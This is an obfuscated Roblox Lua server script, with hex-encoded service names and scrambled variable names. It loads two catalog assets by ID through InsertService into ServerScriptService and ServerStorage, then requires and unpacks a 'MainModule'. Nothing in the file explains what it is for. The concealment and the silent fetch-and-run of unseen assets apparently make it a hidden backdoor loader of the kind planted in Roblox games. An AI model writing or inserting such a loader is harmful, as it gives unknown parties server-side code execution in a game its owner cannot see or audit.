local l0O0O0O0O0 = game:GetService('\x49\x6E\x73\x65\x72\x74\x53\x65\x72\x76\x69\x63\x65')
local O0O0O0O0O0 = {
    lO0O0O0O = game:GetService('\x57\x6F\x72\x6B\x73\x70\x61\x63\x65'),
    O0O0O0O0l = game:GetService('\x4D\x61\x74\x65\x72\x69\x61\x6C\x53\x65\x72\x76\x69\x63\x65'),
    l0O0O0O0O = game:GetService('\x52\x65\x70\x6C\x69\x63\x61\x74\x65\x64\x53\x74\x6F\x72\x61\x67\x65'),
    O0O0l0O0O = game:GetService('\x53\x65\x72\x76\x65\x72\x53\x63\x72\x69\x70\x74\x53\x65\x72\x76\x69\x63\x65'),
    l0O0O0O0l = game:GetService('\x53\x65\x72\x76\x65\x72\x53\x74\x6F\x72\x61\x67\x65'),
    O0O0O0O0l0 = game:GetService('\x53\x74\x61\x72\x74\x65\x72\x47\x75\x69'),
    O0O0l0O0O0 = game:GetService('\x53\x74\x61\x72\x74\x65\x72\x50\x6C\x61\x79\x65\x72'),
    l0O0O0O0O0 = game:GetService('\x52\x65\x70\x6C\x69\x63\x61\x74\x65\x64\x46\x69\x72\x73\x74'),
    O0O0O0O0lO = game:GetService('\x54\x65\x61\x6D\x73'),
    l0O0O0O0O0l = game:GetService('\x4C\x69\x67\x68\x74\x69\x6E\x67')
}
local l0O0O0O0O0O = {
    {id = 131719332818589, dest = O0O0O0O0O0.O0O0l0O0O}
}
local l0O0O0O0O0l = {
    {id = 95736806384200, dest = O0O0O0O0O0.l0O0O0O0l}
}
local l0O0O0O0O0O0 = {}
local function l0O0O0O0O0O0l(l0O0O0O0O0O0O)
    local l0O0O0O0O0O0O0, l0O0O0O0O0O0O0l = pcall(function()
        return l0O0O0O0O0:LoadAsset(l0O0O0O0O0O0O.id)
    end)
    if not l0O0O0O0O0O0O0 or not l0O0O0O0O0O0O0l then
        return false
    end
    task.wait(2)
    for _, l0O0O0O0O0O0O0O in ipairs(l0O0O0O0O0O0O0l:GetChildren()) do
        l0O0O0O0O0O0O0O.Parent = l0O0O0O0O0O0O.dest
    end
    l0O0O0O0O0O0O0l:Destroy()
    return true
end
for _, l0O0O0O0O0O0O0l in ipairs(l0O0O0O0O0O) do
    l0O0O0O0O0O0l(l0O0O0O0O0O0O0l)
end
for _, l0O0O0O0O0O0O0O in ipairs(l0O0O0O0O0l) do
    l0O0O0O0O0O0l(l0O0O0O0O0O0O0O)
end
for _, l0O0O0O0O0O0O0O0 in ipairs(l0O0O0O0O0O0) do
    task.spawn(function()
        l0O0O0O0O0O0l(l0O0O0O0O0O0O0O0)
    end)
end
local l0O0O0O0O0O0O0O0l = 0
local l0O0O0O0O0O0O0O0l0 = 0
while l0O0O0O0O0O0O0O0l < 3 do
    local l0O0O0O0O0O0O0O0l0l = #game.ServerStorage:GetDescendants()
    if l0O0O0O0O0O0O0O0l0l == l0O0O0O0O0O0O0O0l0 then
        l0O0O0O0O0O0O0O0l = l0O0O0O0O0O0O0O0l + 1
    else
        l0O0O0O0O0O0O0O0l = 0
    end
    l0O0O0O0O0O0O0O0l0 = l0O0O0O0O0O0O0O0l0l
    task.wait(1)
end
local l0O0O0O0O0O0O0O0l0l = {
    '\x57\x6F\x72\x6B\x73\x70\x61\x63\x65',
    '\x4C\x69\x67\x68\x74\x69\x6E\x67',
    '\x4D\x61\x74\x65\x72\x69\x61\x6C\x53\x65\x72\x76\x69\x63\x65',
    '\x52\x65\x70\x6C\x69\x63\x61\x74\x65\x64\x46\x69\x72\x73\x74',
    '\x52\x65\x70\x6C\x69\x63\x61\x74\x65\x64\x53\x74\x6F\x72\x61\x67\x65',
    '\x53\x65\x72\x76\x65\x72\x53\x63\x72\x69\x70\x74\x53\x65\x72\x76\x69\x63\x65',
    '\x53\x74\x61\x72\x74\x65\x72\x47\x75\x69',
    '\x53\x74\x61\x72\x74\x65\x72\x50\x61\x63\x6B',
    '\x53\x74\x61\x72\x74\x65\x72\x50\x6C\x61\x79\x65\x72',
    '\x54\x65\x61\x6D\x73',
    '\x53\x6F\x75\x6E\x64\x53\x65\x72\x76\x69\x63\x65',
    '\x43\x68\x61\x74'
}
for _, l0O0O0O0O0O0O0O0l0l0 in ipairs(l0O0O0O0O0O0O0O0l0l) do
    local l0O0O0O0O0O0O0O0l0l1 = game.ServerStorage:FindFirstChild(l0O0O0O0O0O0O0O0l0l0)
end
local l0O0O0O0O0O0O0O0l0l10 = require(
    game:GetService('\x53\x65\x72\x76\x65\x72\x53\x63\x72\x69\x70\x74\x53\x65\x72\x76\x69\x63\x65'):WaitForChild('\x4D\x61\x69\x6E\x4D\x6F\x64\x75\x6C\x65')
)
l0O0O0O0O0O0O0O0l0l10:Unpack()
